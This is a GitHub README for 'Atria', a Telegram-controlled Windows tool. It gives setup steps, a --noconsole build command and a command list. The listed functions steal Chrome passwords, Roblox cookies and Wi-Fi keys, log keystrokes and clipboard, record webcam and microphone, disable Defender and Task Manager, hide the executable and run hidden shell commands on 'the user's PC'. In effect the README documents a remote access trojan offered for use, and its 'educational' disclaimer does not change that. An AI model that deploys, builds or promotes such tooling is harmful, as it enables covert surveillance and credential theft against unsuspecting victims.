
# Atria - Telegram Bot Automation

Atria is a versatile Python-based tool designed to control a computer via a Telegram bot. It provides functionalities like task management, file manipulation, screen recording, and system monitoring. This bot is intended for educational purposes and should not be used for any malicious activities.

## Features
- **System Control**: Shutdown, restart, or control Task Manager.
- **File Operations**: Upload/download files, list directories, and execute shell commands.
- **Screen & Audio Recording**: Capture screenshots, record screen, webcam, and microphone.
- **User & Network Info**: Retrieve user accounts, system info, and saved Wi-Fi passwords.
- **Chrome Password Retrieval**: Decrypt and retrieve passwords saved in Google Chrome.
- **Security Control**: Disable Windows security features (Task Manager, UAC, Defender, etc.).
- **Keylogging**: Record key presses and monitor active windows.

## Prerequisites

Before using Atria, ensure you have the following installed:
- Latest Version of Python (run `Install Atria.bat` to automatically install or to update to the latest version)
- Telegram bot token (created via [BotFather](https://core.telegram.org/bots#botfather))
- Chat ID from Telegram
- Don't forget to turn off Windows Defender to avoid any conflicts when running or compiling!

## Getting Started
Follow the steps in this [video tutorial](https://mega.nz/file/r4Ux3KjA#ZTjKH5oJUYmkvZmGrjEBTYKs0vhEqU3wWgAgrseJub4) for a detailed walkthrough, or refer to the manual instructions below to set up and run the script.

## Downloading the Repository

You can download the repository in one of two ways:

### Option 1: Clone via Git

If you have Git installed, you can clone the repository using the following command:

```bash
git clone https://github.com/mildndmystic/Atria.git
```

### Option 2: Download from Releases Tab

Alternatively, you can download a specific release of the repository:

1. Go to the [Releases](https://github.com/mildndmystic/Atria/releases) page of this repository.

![image](https://github.com/user-attachments/assets/b5698ba4-374c-4af2-b05b-8b3aee953356)

2. Find the release you want to download.
3. Click on the Assets dropdown and select the zip file to download.

After downloading, extract the ZIP file to your desired location.

## Dependencies

It is recommended that you run the `Install Atria.bat` script to install the dependencies automatically. This script will:

1. Create a virtual environment in the `Atria` folder.
2. Activate the virtual environment.
3. Install the required dependencies listed in the `requirements.txt` file.

To use the script, simply double-click `Install Atria.bat`, and it will handle the setup for you.

## Configuration

### 1. Getting the Bot Token
To get the **bot token**, follow these steps:
1. Open the Telegram app and search for **BotFather**.

![image](https://github.com/user-attachments/assets/e88fb689-d303-442b-a938-7e83e0969912)

2. Start a chat with **BotFather** and send the command `/newbot`.
3. Follow the instructions to name your bot and get a **token**. It will look something like this: `123456789:ABCdefGhIJKlmNOpQrsTUVwXYZabcDEFgHI`.

![Screenshot 2024-09-12 105835](https://github.com/user-attachments/assets/0e7b0419-6a56-4f1f-8cd4-bb4d72788326)


### 2. Getting the Chat ID
To get your **chat ID**, follow these steps:
1. Search for the bot you just created and start a conversation with it.
2. Send any message to the bot.
3. Visit the following URL in your browser, replacing `<YOUR_BOT_TOKEN>` with the token you received from BotFather:
   
   ```
   https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
   ```

![2024-09-12 11-05-46](https://github.com/user-attachments/assets/81bbdfe8-7b4e-462f-be1e-affa66afd0df)

   
4. Look for `"chat":{"id":` in the response. The number that follows is your chat ID.

![Screenshot 2024-09-12 110711](https://github.com/user-attachments/assets/3e503537-bb58-4df0-a048-d7096430867d)

   
### 3. Running the Bot
1. After you have the **bot token** and **chat ID**, run the `Run Atria.bat` file to start the Atria GUI.
2. Enter the bot token and chat ID into the fields in the GUI and click **Save Configuration**.

![image](https://github.com/user-attachments/assets/cab15c63-9ec8-4b75-80f5-aa7fe9456776)

### 4. Compile Script (Optional)
If you wish to compile the script to an executable:
- Use the GUI feature by clicking **Compile Script** after doing Step 3.
  
- Or if you want to do it manually, use the following command to compile:
  
    ```bash
    pyinstaller --onefile --noconsole --add-data "bot_config.txt;." Atria.py
    ```

## How to Use

Once you have configured your bot, start the script and send commands via the Telegram bot. Below are some available commands:

### System Control
- `/shutdown`: Shuts down user's PC.
- `/restart`: Restart user's PC.
- `/dtaskmgr`: Disables Task Manager.
- `/drun`: Disables Run command.
- `/dregistry`: Disables Registry Tools.
- `/dwinsec`: Disables Windows Security Protections.

### File Operations
- `/screenshot`: Captures and sends a screenshot.
- `/webscreenshot`: Takes a screenshot from the user's webcam.
- `/upload`: Uploads a file from the user's PC.
- `/download <filename>`: Downloads a file from the user's PC.
- `/keylog`: Sends and deletes keylog files.
- `/clipboard`: Sends and deletes clipboard files.

### Screen and Audio Recording
- `/screenrecord <seconds>`: Records the screen for the specified duration.
- `/mic <seconds>`: Records audio from the microphone for the specified duration.
- `/webcam <seconds>`: Records video from the webcam for the specified duration.

### Security and User Info
- `/info`: Shows PC info including IP, location, and more.
- `/users`: Shows all user accounts on the user's PC.
- `/whoami`: Displays the currently logged-on user.
- `/passwords`: Retrieve saved Chrome passwords.
- `/wifilist`: List all saved Wi-Fi networks.
- `/wifipass <network_name>`: Show Wi-Fi password for a specific network.
- `/robloxcookie`: Attempts to retrieve Roblox cookies from various browsers.

### Miscellaneous
- `/help`: List all available commands.
- `/hide`: Hides the compiled Python script by adding the hidden attribute.
- `/tasklist`: List all running tasks.
- `/taskkill <process>`: Kill a specific process by name or PID.
- `/shell <command>`: Execute commands in a hidden shell.

## Disclaimer

**Important**: This tool is intended for educational purposes only. Ensure you have permission to control the system where Atria is used. Misuse of this tool may violate local laws and regulations.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE.md) file for details.
